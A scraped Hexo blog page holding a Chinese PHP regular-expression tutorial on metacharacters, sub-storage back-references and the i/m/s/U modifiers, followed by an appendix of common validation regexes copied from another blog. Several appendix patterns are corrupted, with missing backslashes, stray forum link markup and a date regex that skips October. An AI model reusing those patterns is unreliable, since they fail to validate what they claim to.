-<h1 id="子存储-扩展"><a href="#子存储-扩展" class="headerlink" title="子存储(扩展)"></a>子存储(扩展)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子存储使用</span></span><br><span class="line">$date=<span class="string">"[2012-08-09],[2012,09-19],[2011/08,09],[2012/10/09],[2013,08,01]"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将上面字串中合法的日期匹配出来</span></span><br><span class="line">preg_match_all(<span class="string">"/\[[0-9]&#123;4&#125;([\-,\/])[0-9]&#123;2&#125;\\1[0-9]&#123;2&#125;\]/"</span>,$date,$a);</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">"&lt;ul </span></span><br><span class="line"><span class="string">style='color:red'&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;aaaaa&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;bbbbb&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;ddddd&lt;/li&gt;</span></span><br><span class="line"><span class="string">            &lt;li&gt;eeeee&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;"</span>;</span><br><span class="line"><span class="comment">//将上面字串中的html标记删除掉(替换空)</span></span><br><span class="line"><span class="keyword">echo</span>  preg_replace(<span class="string">"/&lt;\/?.*?\/?&gt;/s"</span>,<span class="string">""</span>,$str);</span><br></pre></td></tr></table></figure>
-<h1 id="附录-常用正则表达式"><a href="#附录-常用正则表达式" class="headerlink" title="附录  常用正则表达式"></a>附录  常用正则表达式</h1><pre><code>^\d+$  \d 是代表0-9  $必须要以....结束  这是代表非负整数　  正则表达式
-
-平时做网站经常要用正则表达式，下面是一些讲解和例子，仅供大家参考和修改使用： 
-&quot;^\d+$&quot;　　//非负整数（正整数 + 0） 
-&quot;^[0-9]*[1-9][0-9]*$&quot;　　//正整数 
-&quot;^((-\d+)|(0+))$&quot;　　//非正整数（负整数 + 0） 
-&quot;^-[0-9]*[1-9][0-9]*$&quot;　　//负整数 
-&quot;^-?\d+$&quot;　　　　//整数 
-&quot;^\d+(\.\d+)?$&quot;　　//非负浮点数（正浮点数 + 0） 
-&quot;^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$&quot;　　//正浮点数 
-&quot;^((-\d+(\.\d+)?)|(0+(\.0+)?))$&quot;　　//非正浮点数（负浮点数 + 0） 
-&quot;^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$&quot;　　//负浮点数 
-&quot;^(-?\d+)(\.\d+)?$&quot;　　//浮点数 
-&quot;^[A-Za-z]+$&quot;　　//由26个英文字母组成的字符串 
-&quot;^[A-Z]+$&quot;　　//由26个英文字母的大写组成的字符串 
-&quot;^[a-z]+$&quot;　　//由26个英文字母的小写组成的字符串 
-&quot;^[A-Za-z0-9]+$&quot;　　//由数字和26个英文字母组成的字符串 
-&quot;^\w+$&quot;　　//由数字、26个英文字母或者下划线组成的字符串 
-&quot;^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$&quot;　　　　//email地址 
-&quot;^[a-zA-z]+://(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\S*)?$&quot;　　//url 
-/^(d{2}|d{4})-((0([1-9]{1}))|(1[1|2]))-(([0-2]([1-9]{1}))|(3[0|1]))$/ // 年-月-日 
-/^((0([1-9]{1}))|(1[1|2]))/(([0-2]([1-9]{1}))|(3[0|1]))/(d{2}|d{4})$/ // 月/日/年 
-&quot;^([w-.]+)@(([[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.)|(([w-]+.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(]?)$&quot; //Emil 
-/^((\+?[0-9]{2,4}\-[0-9]{3,4}\-)|([0-9]{3,4}\-))?([0-9]{7,8})(\-[0-9]+)?$/ //电话号码 
-&quot;^(d{1,2}|1dd|2[0-4]d|25[0-5]).(d{1,2}|1dd|2[0-4]d|25[0-5]).(d{1,2}|1dd|2[0-4]d|25[0-5]).(d{1,2}|1dd|2[0-4]d|25[0-5])$&quot; //IP地址 
-匹配中文字符的正则表达式： [\u4e00-\u9fa5] 
-匹配双字节字符(包括汉字在内)：[^\x00-\xff] 
-匹配空行的正则表达式：\n[\s| ]*\r 
-匹配HTML标记的正则表达式：/&lt;(.*)&gt;.*&lt;\/\1&gt;|&lt;(.*) \/&gt;/ 
-匹配首尾空格的正则表达式：(^\s*)|(\s*$) 
-匹配Email地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* 
-匹配网址URL的正则表达式：^[a-zA-z]+://([url=file://\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$]\\w+(-\\w+)*)(\\.(\\w+(-\\w+)*))*(\\?\\S*)?$[/url] 
-匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 
-匹配国内电话号码：(\d{3}-|\d{4}-)?(\d{8}|\d{7})? 
-匹配腾讯QQ号：^[1-9]*[1-9][0-9]*$ 
-</code></pre><p><br></p>
-<pre><code>元字符及其在正则表达式上下文中的行为： 
-\ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个后向引用、或一个八进制转义符。 
-^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的Multiline 属性，^ 也匹配 ’\n’ 或 ’\r’ 之后的位置。 
-$ 匹配输入字符串的结束位置。如果设置了 RegExp 对象的Multiline 属性，$ 也匹配 ’\n’ 或 ’\r’ 之前的位置。 
-* 匹配前面的子表达式零次或多次。 
-+ 匹配前面的子表达式一次或多次。+ 等价于 {1,}。 
-? 匹配前面的子表达式零次或一次。? 等价于 {0,1}。 
-{n} n 是一个非负整数，匹配确定的n 次。 
-{n,} n 是一个非负整数，至少匹配n 次。 
-{n,m} m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。在逗号和两个数之间不能有空格。 
-? 当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认 
-的贪婪模式则尽可能多的匹配所搜索的字符串。 
-. 匹配除 &quot;\n&quot; 之外的任何单个字符。要匹配包括 ’\n’ 在内的任何字符，请使用象 ’[.\n]’ 的模式。 
-(pattern) 匹配pattern 并获取这一匹配。 
-(?:pattern) 匹配pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。 
-(?=pattern) 正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。 
-(?!pattern) 负向预查，与(?=pattern)作用相反 
-x|y 匹配 x 或 y。 
-[xyz] 字符集合。 
-[^xyz] 负值字符集合。 
-[a-z] 字符范围，匹配指定范围内的任意字符。 
-[^a-z] 负值字符范围，匹配任何不在指定范围内的任意字符。 
-\b 匹配一个单词边界，也就是指单词和空格间的位置。 
-\B 匹配非单词边界。 
-\cx 匹配由x指明的控制字符。 
-\d 匹配一个数字字符。等价于 [0-9]。 
-\D 匹配一个非数字字符。等价于 [^0-9]。 
-\f 匹配一个换页符。等价于 \x0c 和 \cL。 
-\n 匹配一个换行符。等价于 \x0a 和 \cJ。 
-\r 匹配一个回车符。等价于 \x0d 和 \cM。 
-\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于[ \f\n\r\t\v]。 
-\S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。 
-\t 匹配一个制表符。等价于 \x09 和 \cI。 
-\v 匹配一个垂直制表符。等价于 \x0b 和 \cK。 
-\w 匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。 
-\W 匹配任何非单词字符。等价于 ’[^A-Za-z0-9_]’。 
-\xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。 
-\num 匹配 num，其中num是一个正整数。对所获取的匹配的引用。 
-\n 标识一个八进制转义值或一个后向引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为后向引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个 
-八进制转义值。 
-\nm 标识一个八进制转义值或一个后向引用。如果 \nm 之前至少有is preceded by at least nm 个获取得子表达式，则 nm 为后向引用。如果 \nm 之前至 
-少有 n 个获取，则 n 为一个后跟文字 m 的后向引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。 
-\nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 
-\un 匹配 n，其中 n 是一个用四个十六进制数字表示的Unicode字符。 
-
-匹配中文字符的正则表达式： [\x{4e00}-\x{9fa5}] 
-匹配双字节字符(包括汉字在内)：[^x00-xff] 
-匹配空行的正则表达式：n[s| ]*r 
-匹配HTML标记的正则表达式：/&lt;(.*)&gt;.*|&lt;(.*) /&gt;/ 
-匹配首尾空格的正则表达式：(^s*)|(s*$) 
-匹配Email地址的正则表达式：w+([-+.]w+)*@w+([-.]w+)*.w+([-.]w+)* 
-匹配网址URL的正则表达式：[url=http://([w-]+.)+[w-]+(/[w]http://([w-]+.)+[w-]+(/[w[/url]- ./?%&amp;=]*)? 
-利用正则表达式限制网页表单里的文本框输入内容： 
-用正则表达式限制只能输入中文：onkeyup=&quot;value=value.replace(/[^u4E00-u9FA5]/g,&apos;&apos;)&quot; 
-用正则表达式限制只能输入全角字符： 
-用正则表达式限制只能输入数字：onkeyup=&quot;value=value.replace(/[^d]/g,&apos;&apos;) &quot;onbeforepaste=&quot;clipboardData.setData 
-(&apos;text&apos;,clipboardData.getData(&apos;text&apos;).replace(/[^d]/g,&apos;&apos;))&quot; 
-用正则表达式限制只能输入数字和英文：onkeyup=&quot;value=value.replace(/[W]/g,&apos;&apos;) &quot;onbeforepaste=&quot;clipboardData.setData 
-(&apos;text&apos;,clipboardData.getData(&apos;text&apos;).replace(/[^d]/g,&apos;&apos;))&quot; 
-</code></pre><p><br><br>    =========常用正则式 </p>
-<pre><code>匹配中文字符的正则表达式： [\x{4e00}-\x{9fa5}]
-匹配双字节字符(包括汉字在内)：[^\x00-\xff] 
-匹配空行的正则表达式：\n[\s| ]*\r 
-匹配HTML标记的正则表达式：/&lt;(.*)&gt;.*&lt;\/\1&gt;|&lt;(.*) \/&gt;/ 
-匹配首尾空格的正则表达式：(^\s*)|(\s*$) 
-匹配IP地址的正则表达式：/(\d+)\.(\d+)\.(\d+)\.(\d+)/g // 
-匹配Email地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* 
-匹配网址URL的正则表达式：[url=http://(/[\w-]+\.)+[\w-]+(/[\w]http://(/[\w-]+\.)+[\w-]+(/[\w[/url]- ./?%&amp;=]*)? 
-sql语句：^(select|drop|delete|create|update|insert).*$ 
-1、非负整数：^\d+$ 
-2、正整数：^[0-9]*[1-9][0-9]*$ 
-3、非正整数：^((-\d+)|(0+))$ 
-4、负整数：^-[0-9]*[1-9][0-9]*$ 
-5、整数：^-?\d+$ 
-6、非负浮点数：^\d+(\.\d+)?$ 
-7、正浮点数：^((0-9)+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 
-8、非正浮点数：^((-\d+\.\d+)?)|(0+(\.0+)?))$ 
-9、负浮点数：^(-((正浮点数正则式)))$ 
-10、英文字符串：^[A-Za-z]+$ 
-11、英文大写串：^[A-Z]+$ 
-12、英文小写串：^[a-z]+$ 
-13、英文字符数字串：^[A-Za-z0-9]+$ 
-14、英数字加下划线串：^\w+$ 
-15、E-mail地址：^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$ 
-16、URL：^[a-zA-Z]+://(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\s*)?$ 
-或：^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&amp;_~`@[\]\&apos;:+!]*([^&lt;&gt;\&quot;\&quot;])*$ 
-17、邮政编码：^[1-9]\d{5}$ 
-18、中文：^[\u0391-\uFFE5]+$ 
-19、电话号码：^((\(\d{2,3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}(\-\d{1,4})?$ 
-20、手机号码：^((\(\d{2,3}\))|(\d{3}\-))?13\d{9}$ 
-21、双字节字符(包括汉字在内)：^\x00-\xff 
-22、匹配首尾空格：(^\s*)|(\s*$)（像vbscript那样的trim函数） 
-23、匹配HTML标记：&lt;(.*)&gt;.*&lt;\/\1&gt;|&lt;(.*) \/&gt; 
-24、匹配空行：\n[\s| ]*\r 
-25、提取信息中的网络链接：(h|H)(r|R)(e|E)(f|F) *= *(&apos;|&quot;)?(\w|\\|\/|\.)+(&apos;|&quot;| *|&gt;)? 
-26、提取信息中的邮件地址：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* 
-27、提取信息中的图片链接：(s|S)(r|R)(c|C) *= *(&apos;|&quot;)?(\w|\\|\/|\.)+(&apos;|&quot;| *|&gt;)? 
-28、提取信息中的IP地址：(\d+)\.(\d+)\.(\d+)\.(\d+) 
-29、提取信息中的中国手机号码：(86)*0*13\d{9} 
-30、提取信息中的中国固定电话号码：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{8} 
-31、提取信息中的中国电话号码（包括移动和固定电话）：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{7,14} 
-32、提取信息中的中国邮政编码：[1-9]{1}(\d+){5} 
-33、提取信息中的浮点数（即小数）：(-?\d*)\.?\d+ 
-34、提取信息中的任何数字 ：(-?\d*)(\.\d+)? 
-35、IP：(\d+)\.(\d+)\.(\d+)\.(\d+) 
-36、电话区号：/^0\d{2,3}$/ 
-37、腾讯QQ号：^[1-9]*[1-9][0-9]*$ 
-38、帐号(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 
-39、中文、英文、数字及下划线：^[\u4e00-\u9fa5_a-zA-Z0-9]+$
-</code></pre><p><hr><br>资料摘自：<a href="http://www.cnblogs.com/yafei236/p/4168290.html" target="_blank" rel="noopener">http://www.cnblogs.com/yafei236/p/4168290.html</a></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/14/PHP正则表达式/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/14/PHP正则表达式/" class="post-title-link" itemprop="url">PHP正则表达式</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-14 19:52:34" itemprop="dateCreated datePublished" datetime="2019-02-14T19:52:34+08:00">2019-02-14</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-02-23 19:10:41" itemprop="dateModified" datetime="2019-02-23T19:10:41+08:00">2019-02-23</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/PHP正则表达式/" itemprop="url" rel="index"><span itemprop="name">PHP正则表达式</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="一、-正则表达式介绍"><a href="#一、-正则表达式介绍" class="headerlink" title="一、    正则表达式介绍"></a>一、    正则表达式介绍</h1><p>描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作！<br>        普通字符和特殊字符组成的一个字符串</p>
-<pre><code>1. 用途：匹配、查找、替换、分割 
-2. php提供了两套正则表达式函数库 
-    （1）. Perl 兼容正则表达式函数（推荐使用） 
-    （2）. POSIX 扩展正则表达式函数
-</code></pre><h1 id="二、语法规则"><a href="#二、语法规则" class="headerlink" title="二、语法规则"></a>二、语法规则</h1><pre><code>表达式的格式： &quot;/表达式/[修正符]&quot; 
-</code></pre><p>其中修正符是可选的，表示对表达式做额外的修饰。<br>我们一般习惯使用正斜线”/“作为定界的字符,前后一致<br>注意：定界符不可以是字母、数字和斜线\。<br>                像“#”、“|”、“!”等都可以的<br>                如：/…/   #…#  |….| </p>
-<h1 id="三、-正则表达式的组成部分："><a href="#三、-正则表达式的组成部分：" class="headerlink" title="三、 正则表达式的组成部分："></a>三、 正则表达式的组成部分：</h1><h2 id="1-基本单位-原子"><a href="#1-基本单位-原子" class="headerlink" title="1. 基本单位(原子)"></a>1. 基本单位(原子)</h2><p>原子是组成正则表达式的基本单位,在分析正则表达式时，应作为一个整体。<br>       原子包括以下内容: </p>
-<pre><code>* 单个字符、数字，如a-z，A-Z，0-9。 
-* 模式单元，如（ABC）可以理解为由多个原子组成的大的原子。 
-* 原子表，如 [ABC]。 
-* 重新使用的模式单元，如：\\1 
-* 普通转义字符，如：\d， \D， \w 
-* 转义元字符，如：\*，\. 
-* 元字符
-</code></pre><h2 id="2-元字符（具有特殊意义字符）："><a href="#2-元字符（具有特殊意义字符）：" class="headerlink" title="2. 元字符（具有特殊意义字符）："></a>2. 元字符（具有特殊意义字符）：</h2><h3 id="各个字符含义"><a href="#各个字符含义" class="headerlink" title="各个字符含义"></a>各个字符含义</h3><pre><code>[] 表示单个字符的原子表 
-    例如：[aoeiu] 表示任意一个元音字母 
-          [0-9] 表示任意一位数字 
-          [a-z][0-9]表示小写字和一位数字构成的两位字符 
-          [a-zA-Z0-9] 表示任意一位大小字母或数字 
-[^] 表示除中括号内原子之外的任何字符 是[]的取反 
-    例如：[^0-9] 表示任意一位非数字字符 
-          [^a-z] 表示任意一位非小写字母 
-{m}    表示对前面原子的数量控制，表示是m次 
-    例如：[0-9]{4} 表示4为数字 
-          [1][3-8][0-9]{9} 手机号码 
-{m,} 表示对前面原子的数量控制，表示是至少m次          
-    例如： [0-9]{2,} 表示两位及以上的数字 
-{m,n}表示对前面原子的数量控制，表示是m到n次 
-    例如： [a-z]{6,8} 表示6到8位的小写字母 
-* 表示对前面原子的数量控制，表示是任意次，等价于{0,} 
-+ 表示对前面原子的数量控制，表示至少1次，等价于{1,} 
-? 表示对前面原子的数量控制，表示0次或1次（可有可无） 等价于{0,1} 
-    例如：正整数：[1-9][0-9]* 
-            整数：[\-]?[0-9]+ 
-() 表示一个整体原子，还有一个子存储单元的作用【使用\\数字或$数字来代表圆括号部分所匹配到的内容】。 
-        也可以使用?:来拒绝子存储。 （?:.*?） 
-    例如：（red） 字串red 
-           (rea|blue) 字串red或blue 
-           (abc){2} 表示两个abc 
-|  表示或的意思 
-        (rea|blue) 字串red或blue 
-^  用在正则单元块的开头处，表示必须以指定的开头 
-$  用在正则单元块的结尾处，表示必须以指定的结尾 
-.  表示任意一个除换行符之外的字符 
-</code></pre><h3 id="（）的使用："><a href="#（）的使用：" class="headerlink" title="（）的使用："></a>（）的使用：</h3><p>如果使用对应的\\数字或$数字来代表圆括号部分所匹配到的内容，那么要注意匹配完整</p>
-<p>由于没用匹配到\\1对应的e，匹配失败<br><img src="/2019/02/14/PHP正则表达式/元1.png" alt=""><br>只有对应的内容都匹配到了才是匹配成功。array数组中分别保存了匹配的完整字符串，和（）所匹配到的字符<br><img src="/2019/02/14/PHP正则表达式/元2.png" alt=""></p>
-<p><br></p>
-<h3 id="常用组合（贪婪匹配问题）"><a href="#常用组合（贪婪匹配问题）" class="headerlink" title="常用组合（贪婪匹配问题）"></a>常用组合（贪婪匹配问题）</h3><p>.与{n}配合  中间有n个非空<br>.与*配合   默认是贪婪匹配（尽可能多的去匹配字符） 中间有任意个非空<br><img src="/2019/02/14/PHP正则表达式/元3.png" alt=""><br>.*?  可以解决贪婪匹配（表示最小匹配所有字符）<br><img src="/2019/02/14/PHP正则表达式/元4.png" alt=""><br>也可以使用模式修正符来解决：  m</p>
-<h2 id="3-普通转义字符"><a href="#3-普通转义字符" class="headerlink" title="3. 普通转义字符:"></a>3. 普通转义字符:</h2><p>\d    匹配一个数字；等价于[0-9]<br>\D    匹配除数字以外任何一个字符；等价于[^0-9]<br>\w    匹配一个英文字母、数字或下划线；等价于[0-9a-zA-Z_]<br>\W    匹配除英文字母、数字和下划线以外任何一个字符；等价于[^0-9a-zA-Z_]<br>\s    匹配一个空白字符；等价于[\f\n\r\t\v]<br>\S    匹配除空白字符以外任何一个字符；等价于[^\f\n\r\t\v]<br>\f    匹配一个换页符等价于 \x0c 或 \cL<br>\n    匹配一个换行符；等价于 \x0a 或 \cJ<br>\r    匹配一个回车符等价于\x0d 或 \cM<br>\t    匹配一个制表符；等价于 \x09\或\cl<br>\v    匹配一个垂直制表符；等价于\x0b或\ck<br>\oNN    匹配一个八进制数字<br>\xNN    匹配一个十六进制数字<br>\cC    匹配一个控制字符 </p>
-<h2 id="4-常见模式修正符"><a href="#4-常见模式修正符" class="headerlink" title="4. 常见模式修正符"></a>4. 常见模式修正符</h2><h3 id="常见四种"><a href="#常见四种" class="headerlink" title="常见四种"></a>常见四种</h3><pre><code>i    在和模式进行匹配时不区分大小写&quot;/[a-zA-Z]/&quot; &lt;==&gt;&quot;/[a-z]/i&quot; 
-m    多行匹配，如果目标字符串 中没有&quot;\n&quot;字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响
-s    如果设定了此修正符，那么.将匹配所有的字符包括换行符（表示匹配视为单行：就是可以让点.支持换行） 
-U    禁止贪婪匹配
-</code></pre><h3 id="U-禁止贪婪匹配"><a href="#U-禁止贪婪匹配" class="headerlink" title="U 禁止贪婪匹配"></a>U 禁止贪婪匹配</h3><p><img src="/2019/02/14/PHP正则表达式/修1.png" alt=""></p>
-<h3 id="i-不区分大小写"><a href="#i-不区分大小写" class="headerlink" title="i 不区分大小写"></a>i 不区分大小写</h3><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p>
-<h3 id="m-多行匹配"><a href="#m-多行匹配" class="headerlink" title="m 多行匹配"></a>m 多行匹配</h3><p><strong>（如果目标字符串中没用“\n”字符，或者模式中没用出现^或$，设置这个修饰符不产生任何影响）</strong><br>使用条件</p>
-<ol>
-<li>目标字符串必须包含换行符“\n”  字符串中出现\n就表示新的一行开始</li>
-<li>正则表达式中必须要出现^或者$<br>未使用修正符时：<br><img src="/2019/02/14/PHP正则表达式/修2.png" alt=""><br><br></li>
-</ol>
-<p>此时使用模式修正符，发现没用改动！<br><img src="/2019/02/14/PHP正则表达式/修3.png" alt=""></p>
-<p>为什么？<br>因为在单引号里面不识别转义\n，它认为是普通的字符，而不是换行！！！</p>
-<p>因此，我们将单引号换成双引号（我们可以发现\n有了高亮，实现了转义）<br><img src="/2019/02/14/PHP正则表达式/修4.png" alt=""><br>此时发现，m 模式修饰符起到了作用<br>换成以test结束试试（使用$）<br><img src="/2019/02/14/PHP正则表达式/修5.png" alt=""><br>依旧可以</p>
-<p>\n代表着换行那么，我们手动换行试试？<br><img src="/2019/02/14/PHP正则表达式/修6.png" alt=""><br>只能匹配一个，此时匹配的是最后一个<br>为什么？<br>解释：<br><strong>在windows操作系统中，我们所看到的换行（肉眼看到的换行现象），其实是通过两个字符来完成的（\r\n）<br>在linux操作系统中看，我们所看到的换行（肉眼看到的换行现象），是通过\n来完成的</strong></p>
-<p>如果是这样，我们修改匹配规则：  $pattern=’/test\r$/m’;<br><img src="/2019/02/14/PHP正则表达式/修7.png" alt=""><br>发现匹配到了三个，此时应为前三个匹配到</p>
-<p>那么我们如何在windows如何匹配到四个呢？我们可以使用*来使得\r出不出现都能匹配到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pattern=<span class="string">'/test\r*$/m'</span>;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/02/14/PHP正则表达式/修8.png" alt=""><br>此时成功匹配到四个</p>
-<h3 id="s-让点-支持换行"><a href="#s-让点-支持换行" class="headerlink" title="s  让点.支持换行"></a>s  让点.支持换行</h3><p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符<br>不使用s 修正符时<br><img src="/2019/02/14/PHP正则表达式/修9.png" alt=""><br>使用s修正符：<br><img src="/2019/02/14/PHP正则表达式/修10.png" alt=""><br>使用手动回车代替\n时：<br><img src="/2019/02/14/PHP正则表达式/修11.png" alt=""><br>发现：<strong>同样我们在使用模式修正符s时，如果我们不是写\n而是手动回车也会发生同样的错误</strong></p>
-<p><hr><br>补充：<br>\r 回车符<br>\n 换行符<br>两者区别<br>以下代码摘自网络：本帖最后由 rossini23 于 2011-05-26 23:48 编辑<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"this is\ra test\r\n"</span>); <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"this is\na test\r\n"</span>); <span class="comment">//2</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"this is\r\na test\r\n"</span>); <span class="comment">//3</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a tests</span><br><span class="line"><span class="keyword">this</span> is</span><br><span class="line">a test</span><br><span class="line"><span class="keyword">this</span> is</span><br><span class="line">a test</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>	</span><br><span class="line"><span class="number">3.</span>	<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line">4.	&#123;</span><br><span class="line"><span class="number">5.</span>	        <span class="built_in">printf</span>(<span class="string">"this is\ra test\r\n"</span>); <span class="comment">//1</span></span><br><span class="line"><span class="number">6.</span>	        <span class="built_in">printf</span>(<span class="string">"this is\na test\r\n"</span>); <span class="comment">//2</span></span><br><span class="line"><span class="number">7.</span>	        <span class="built_in">printf</span>(<span class="string">"this is\r\na test\r\n"</span>); <span class="comment">//3</span></span><br><span class="line"><span class="number">8.</span>	        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">9.</span>	&#125;</span><br><span class="line">上面这一小段代码在Linux、windows下的输出如下：</span><br><span class="line"><span class="number">1.</span>	a tests</span><br><span class="line"><span class="number">2.</span>	<span class="keyword">this</span> is</span><br><span class="line"><span class="number">3.</span>	a test</span><br><span class="line"><span 